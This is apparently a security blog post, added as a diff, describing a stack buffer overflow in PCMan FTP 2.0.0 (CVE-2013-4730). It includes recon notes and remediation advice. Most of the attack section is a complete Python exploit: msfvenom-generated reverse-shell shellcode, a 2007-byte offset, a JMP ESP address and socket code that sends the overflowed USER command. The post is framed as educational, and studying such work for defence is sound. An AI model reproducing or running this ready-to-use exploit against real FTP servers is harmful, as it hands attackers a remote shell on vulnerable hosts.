@@ -1,0 +1,150 @@
+---
+title: "PCMan Buffer Overflow"
+date: 2026-03-03 00:00:00 +/-TTTT
+categories: [Hacking, buffer-overflow]
+tags: [ftp, buffer-overflow, pcman]     # TAG names should always be lowercase
+---
+This is a test.
+
+# RCE via Buffer Overflow - PCMan FTP 2.0.0
+## Executive Summary
+This project details a Stack-based Buffer Overflow vulnerability in a legacy version of the free FTP server software, PCMan, also known as PCManFTPD2.
+
+The application does not perform any input-length checks for parts of the standard FTP initialization or handshake process. This opens up the opportunity for overwriting of memory addresses through a remote command, potentially leading to execution of an injected piece of malicious code ie. TCP reverse shell.
+
+```
+[+] Vulnerability: Unauthorized Remote Buffer Overflow
+[+] Severity: Critical (CVSS 10.0)
+[+] Related CVE: 2013-4730
+[+] Impact: Full system compromise
+```
+
+## Technical Analysis
+### ♦️ Initial Reconnaissance
+-  Scanned binaries with Detect-It-Easy & radare2 for protection features.
+-  Researched RFC 959 for FTP communications spec.
+-  Performed manual translation of included PCMan FTP documentation.
+-  Set up PCMan app to accept incoming FTP connections and observed behavior.
+
+### ♦️ Triage & Testing
+- Refactored existing Perl PoC script into Python for testing.
+- Confirmed that overwriting stack through "overflowed" USER command is possible.
+- Combined a "fuzzing script" with WinDbg to determine exact offset to reach EIP.
+- Combined Mona with x64dbg to determine available modules for an "ESP Trampoline" with the following command: ``mona.mona("jmp -r esp -m *")``
+
+### ♦️ Exploit Strategy
+- Constructed payload with following structure:<br>``Filler + 'JMP ESP' Address + NOP Sled + Shellcode``
+- Set up a netcat listening service on Kali Linux.
+- Launched PCMan app and attached WinDbg to running process.
+- Executed Python exploit script and step forward with WinDbg.
+- Received connection on Kali Linux VM.
+
+## Proof of Concept
+```
+# PCMan FTP 2.0.0 Remote Buffer Overflow
+# Author: Vis V
+# Tested on: Windows 10 22H2.
+# For educational purposes only.
+
+import socket
+import time
+
+# TARGET DETAILS
+tgt_ip = "10.0.2.15"
+tgt_port = 2100
+
+# PAYLOAD CONSTRUCTION
+# msfvenom -p windows/shell_reverse_tcp lhost=<atk_machine_ip> lport=<listen_port>
+EXITFUNC=thread -b '\x00\x0a\x0d' -a x86 --platform Windows -f python
+# offset: 2007
+# badchars: \x00\x0a\x0d
+# EIP: 0x74e32fd9 (JMP ESP)
+
+buf =  b""
+buf += b"\xb8\x3c\xc0\xc8\x2f\xd9\xe8\xd9\x74\x24\xf4\x5a"
+buf += b"\x2b\xc9\xb1\x52\x83\xc2\x04\x31\x42\x0e\x03\x7e"
+buf += b"\xce\x2a\xda\x82\x26\x28\x25\x7a\xb7\x4d\xaf\x9f"
+buf += b"\x86\x4d\xcb\xd4\xb9\x7d\x9f\xb8\x35\xf5\xcd\x28"
+buf += b"\xcd\x7b\xda\x5f\x66\x31\x3c\x6e\x77\x6a\x7c\xf1"
+buf += b"\xfb\x71\x51\xd1\xc2\xb9\xa4\x10\x02\xa7\x45\x40"
+buf += b"\xdb\xa3\xf8\x74\x68\xf9\xc0\xff\x22\xef\x40\x1c"
+buf += b"\xf2\x0e\x60\xb3\x88\x48\xa2\x32\x5c\xe1\xeb\x2c"
+buf += b"\x81\xcc\xa2\xc7\x71\xba\x34\x01\x48\x43\x9a\x6c"
+buf += b"\x64\xb6\xe2\xa9\x43\x29\x91\xc3\xb7\xd4\xa2\x10"
+buf += b"\xc5\x02\x26\x82\x6d\xc0\x90\x6e\x8f\x05\x46\xe5"
+buf += b"\x83\xe2\x0c\xa1\x87\xf5\xc1\xda\xbc\x7e\xe4\x0c"
+buf += b"\x35\xc4\xc3\x88\x1d\x9e\x6a\x89\xfb\x71\x92\xc9"
+buf += b"\xa3\x2e\x36\x82\x4e\x3a\x4b\xc9\x06\x8f\x66\xf1"
+buf += b"\xd6\x87\xf1\x82\xe4\x08\xaa\x0c\x45\xc0\x74\xcb"
+buf += b"\xaa\xfb\xc1\x43\x55\x04\x32\x4a\x92\x50\x62\xe4"
+buf += b"\x33\xd9\xe9\xf4\xbc\x0c\xbd\xa4\x12\xff\x7e\x14"
+buf += b"\xd3\xaf\x16\x7e\xdc\x90\x07\x81\x36\xb9\xa2\x78"
+buf += b"\xd1\xcc\x32\x80\x2e\xb9\x30\x84\x13\x11\xbc\x62"
+buf += b"\x39\x71\xe8\x3d\xd6\xe8\xb1\xb5\x47\xf4\x6f\xb0"
+buf += b"\x48\x7e\x9c\x45\x06\x77\xe9\x55\xff\x77\xa4\x07"
+buf += b"\x56\x87\x12\x2f\x34\x1a\xf9\xaf\x33\x07\x56\xf8"
+buf += b"\x14\xf9\xaf\x6c\x89\xa0\x19\x92\x50\x34\x61\x16"
+buf += b"\x8f\x85\x6c\x97\x42\xb1\x4a\x87\x9a\x3a\xd7\xf3"
+buf += b"\x72\x6d\x81\xad\x34\xc7\x63\x07\xef\xb4\x2d\xcf"
+buf += b"\x76\xf7\xed\x89\x76\xd2\x9b\x75\xc6\x8b\xdd\x8a"
+buf += b"\xe7\x5b\xea\xf3\x15\xfc\x15\x2e\x9e\x1c\xf4\xfa"
+buf += b"\xeb\xb4\xa1\x6f\x56\xd9\x51\x5a\x95\xe4\xd1\x6e"
+buf += b"\x66\x13\xc9\x1b\x63\x5f\x4d\xf0\x19\xf0\x38\xf6"
+buf += b"\x8e\xf1\x68"
+offset = b"X" * 2007
+eip = b"\xfc\x02\xc1\x75"
+nops = b"\x90" * 20
+
+# FINAL ASSEMBLY
+payload = offset + eip + nops + buf
+
+# NON-TLS HANDSHAKE
+try:
+	# Begin connection attempt
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	print(f"[*] Connecting to Target => {tgt_ip}...")
+	s.connect((tgt_ip, tgt_port))
+
+	# Receive banner
+	print(s.recv(1024).decode('utf-8'))
+
+	# Perform FTP Handshake
+	print("[*] Sending USER...")
+	s.send(b"USER " + payload + b"\r\n")
+	print(s.recv(1024).decode('utf-8'))
+
+  	# Optional Blocks
+	print("[*] Sending PASS...")
+	s.send(b"PASS 1234\r\n")
+	print(s.recv(1024).decode('utf-8'))
+
+	print("[*] Sending RMD Command...")
+	s.send(b"RMD\r\n")
+  
+  	# Clean Up
+	time.sleep(1)
+	s.close()
+	print("[+] Exploit sent successfully.")
+
+except Exception as e:
+	print(f"[!] Connection failed: {e}")
+```
+<img width="726" height="297" alt="success" src="https://github.com/user-attachments/assets/8167ccbf-e1bc-4426-9ab3-de46d23d71ed" />
+
+## Remediation
+- Replace PCMan with actively maintained Secure FTP alternative.
+- Implement network segmentation to minimize attack surface for shared services.
+- Monitor network for long chain of NOP or "filler" bytes.
+- Remove default configuration ``ex. user:anonymous, password:1234``
+- Ensure modern protection features are enabled ``ex. ASLR/DEP.``
+
+## Special Considerations
+- The specific version of PCManFTPD tested during this project was made available circa 2005.
+- ASLR did not arrive until much later in Windows Vista (2007).
+- Exploitation is still possible in a modern Windows env if "JMP ESP" address is located in a legacy or custom binary that may not be compiled with NX/DEP features.
+- ASLR/DEP alone is not infallible. ROP chains can be utilized to overcome memory address randomization.
+- The shellcode used in the above payload is for demonstration purposes. Defender will instantly flag simple reverse shells.
+- The PCMan FTP app has the same absence of input-length checks for the PASS and RMD commands. For this project, the USER command was used to simplify demonstration.
+
+## Disclaimer
+This project is strictly for educational purposes only. No malicious binaries are provided.
